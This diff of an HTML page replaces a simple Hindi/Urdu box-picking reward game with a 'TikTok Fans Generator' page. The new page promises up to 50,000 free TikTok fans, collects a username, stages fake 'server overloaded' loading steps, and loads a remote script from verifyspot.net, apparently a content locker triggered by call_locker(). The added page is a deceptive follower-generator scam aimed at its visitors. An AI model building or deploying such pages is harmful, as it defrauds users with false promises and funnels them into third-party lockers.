@@ -1,149 +1,125 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
+
+
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>9 Box Reward Game</title>
-    <style>
-        body {
-            text-align: center;
-            font-family: Arial, sans-serif;
-            background-color: #121212;
-            color: white;
-        }
-        h1 {
-            color: #00ff99;
-        }
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(3, 100px);
-            grid-template-rows: repeat(3, 100px);
-            gap: 10px;
-            justify-content: center;
-            margin-top: 20px;
-        }
-        .box {
-            width: 100px;
-            height: 100px;
-            background-color: #444;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            color: white;
-            cursor: pointer;
-            border-radius: 10px;
-            position: relative;
-        }
-        .box img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border-radius: 10px;
-            display: none;
-        }
-        .hidden {
-            display: none;
-        }
-        form {
-            background: #222;
-            padding: 20px;
-            margin-top: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px #00ff99;
-            width: 80%;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        input, button {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0;
-            border: none;
-            border-radius: 5px;
-        }
-    </style>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
+    <link rel="stylesheet" href="css/flag-icon.min.css">
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <script type="text/javascript" id="ogjs" src="https://www.verifyspot.net/cl/load.php?id=be7c65e083d6ca1086beb261f5a54de4"></script>
+
+
+    <title>TikTok Fans Generator</title>
+
 </head>
+
 <body>
 
-    <h1>🎁 9 Box Reward Game 🎁</h1>
-    <p>Aapke paas har **12 ghante** me **3 chances** hain!</p>
-    <p id="chancesLeft"></p>
+<div id="particles-js"></div>
 
-    <div class="grid" id="grid">
-        <!-- 9 Boxes -->
-        <div class="box" onclick="checkBox(0)"><img src="https://via.placeholder.com/100/00ff00?text=✅"></div>
-        <div class="box" onclick="checkBox(1)"><img src="https://via.placeholder.com/100/ff0000?text=❌"></div>
-        <div class="box" onclick="checkBox(2)"><img src="https://via.placeholder.com/100/ff0000?text=❌"></div>
-        <div class="box" onclick="checkBox(3)"><img src="https://via.placeholder.com/100/ff0000?text=❌"></div>
-        <div class="box" onclick="checkBox(4)"><img src="https://via.placeholder.com/100/ff0000?text=❌"></div>
-        <div class="box" onclick="checkBox(5)"><img src="https://via.placeholder.com/100/ff0000?text=❌"></div>
-        <div class="box" onclick="checkBox(6)"><img src="https://via.placeholder.com/100/ff0000?text=❌"></div>
-        <div class="box" onclick="checkBox(7)"><img src="https://via.placeholder.com/100/ff0000?text=❌"></div>
-        <div class="box" onclick="checkBox(8)"><img src="https://via.placeholder.com/100/ff0000?text=❌"></div>
+    <div class="container">
+
+        <div class="row text-center justify-content-center">
+
+            <div class="col text-center justify-content-center d-none d-md-block">
+
+                <img src="img/logo-1.png" class="w-25 mb-4">
+
+                <h1 class="ffflick mt-4">Our <strong>TikTok-Tool</strong> works only on mobile phones and tablets. Get back here with your smartphone or tablet to <strong> get up to 50,000 TikTok fans for free.</strong>.</h1>
+
+            </div>
+
+            <div class="col text-center justify-content-center pl-0 pr-0 d-md-none">
+
+                <div class="tttop p-2">
+
+                  <div class="tttleft"> <!--<img src="flags/1x1/de.svg" class="flick-flag">--> </div> <div class="tttmiddle"> <!--<h5 class="m-0"></span> 170.***.177.105 erhielt <br><strong>50000 neue fans</strong></h5>--> </div> <div class="tttright"> <img src="img/logo-1.png" class="flick-logo"> </div>
+
+                </div>
+
+                <div class="mmmain p-4">
+
+                  <div class="XDD">
+
+                    <h1 class="s_1" style="font-size: 1.8rem !important;">Get yourself <strong>50 000</strong></h1>
+
+                    <img class="img-fluid pl-2 pr-2 mt-1 mb-1" src="img/logo-2.png">
+
+                    <h1 class="s_1">new <strong>fans</strong> free</h1>
+
+                    <h2 class="s_2 s_25 justify-content-center mt-1">Server connection</h2>
+
+                    <h2 class="s_4 justiy-content-center mt-1">Last step - Server Overloaded</h2>
+
+                    <h5 class="s_4">Our server is overloaded, but you can still get your followers instantly!Click on the button below in order to get your followers.</h5>
+
+                    <button class="btn btn-lg btn-block btn-2 s_4 mt-3" onclick="call_locker();">Continue</button>
+
+                    <div id="ppp" class="s_2 mb-2"></div>
+
+                    <hr class="bg-6 p-0 m-2 s_1">
+
+                    <div class="form-group mb-2 s_1">
+                        <label for="tiktok-name"><strong>Step 1: </strong>Enter your TikTok username.</label>
+                        <input type="text" class="form-control form-control-lg" id="tiktok-name" aria-describedby="tiktok-help" placeholder="TikTok Username">
+                        <small id="tiktok-help" class="form-text c-5">With our <strong>TikTok tool</strong> is completely safe and free.</small>
+
+                        <select class="form-control form-control-lg mt-1" id="fans-select" aria-describedby="select-help">
+
+                        <option value="">Select number of fans</option>
+                        <option value="1000">1000 Fans</option>
+                        <option value="5000">5000 Fans</option>
+                        <option value="10000">10 000 Fans</option>
+                        <option value="25000">25 000 Fans</option>
+                        <option value="50000">50 000 Fans</option>
+
+
+                    </select>
+
+                    </div>
+
+                    <button class="btn btn-lg btn-block btn-1 s_1 t-c" onclick="s_1();">Continue</button>
+
+                    <h5 id="loading1" class="s_3"></h5>
+                    <h5 id="loading2" class="s_3"></h5>
+                    <h5 id="loading3" class="s_3"></h5>
+                    <h5 id="loading4" class="s_3"></h5>
+                    <h5 id="loading5" class="s_3"></h5>
+
+                    <button class="btn btn-lg btn-block btn-2 s_3 mt-3" onclick="lala();">Continue</button>
+
+                  </div>
+
+                </div>
+
+                <div class="bbbottom p-2">
+
+                </div>
+
+            </div>
+
+        </div>
+
     </div>
 
-    <p id="result"></p>
+    <script src="js/jquery-3.4.1.min.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/particles.min.js"></script>
+    <script src="js/progressbar.min.js"></script>
+    <script src="js/main.js"></script>
 
-    <!-- Reward Claim Form -->
-    <form id="rewardForm" class="hidden" action="https://formspree.io/f/xbldyrpw" method="POST">
-        <h2>🎁 Reward Claim Karo</h2>
-        <input type="text" name="name" id="name" placeholder="Apna Naam Likho" required>
-        <input type="text" name="video_link" id="videoLink" placeholder="Apni TikTok Video ka Link Dalo" required>
-        <button type="submit">Submit</button>
-    </form>
 
-    <script>
-        let correctBox = Math.floor(Math.random() * 9);
-        let gameOver = false;
-        let chances = parseInt(localStorage.getItem("chances")) || 0;
-        let lastPlayed = parseInt(localStorage.getItem("lastPlayed")) || 0;
-        let now = Date.now();
-        
-        if (now - lastPlayed > 12 * 60 * 60 * 1000) {
-            chances = 0;
-            localStorage.setItem("chances", chances);
-            localStorage.setItem("lastPlayed", now);
-        }
 
-        document.getElementById("chancesLeft").innerText = "Aapke bache hue chances: " + (3 - chances);
-
-        function checkBox(index) {
-            if (gameOver || chances >= 3) {
-                alert("Aapke 3 chances khatam ho gaye! 12 ghante baad dobara try karein.");
-                return;
-            }
-
-            gameOver = true;
-            let images = document.querySelectorAll(".box img");
-            images[index].style.display = "block";
-
-            if (index === correctBox) {
-                document.getElementById("result").innerText = "🎉 Mubarak ho! Aapne reward jeet liya.";
-                document.getElementById("rewardForm").classList.remove("hidden");
-            } else {
-                document.getElementById("result").innerText = "❌ Galat! Game reset ho raha hai...";
-                setTimeout(() => {
-                    location.reload();
-                }, 1000);
-            }
-
-            chances++;
-            localStorage.setItem("chances", chances);
-            localStorage.setItem("lastPlayed", now);
-        }
-
-        document.getElementById("rewardForm").addEventListener("submit", function(event) {
-            let videoLink = document.getElementById("videoLink").value;
-            // Updated regex to accept any valid URL
-            let regex = /^(https?:\/\/[^\s]+)$/;
-
-            if (!regex.test(videoLink)) {
-                alert("Kripya valid URL daalain!");
-                event.preventDefault();
-            }
-        });
-    </script>
 
 </body>
+
+
+
 </html>
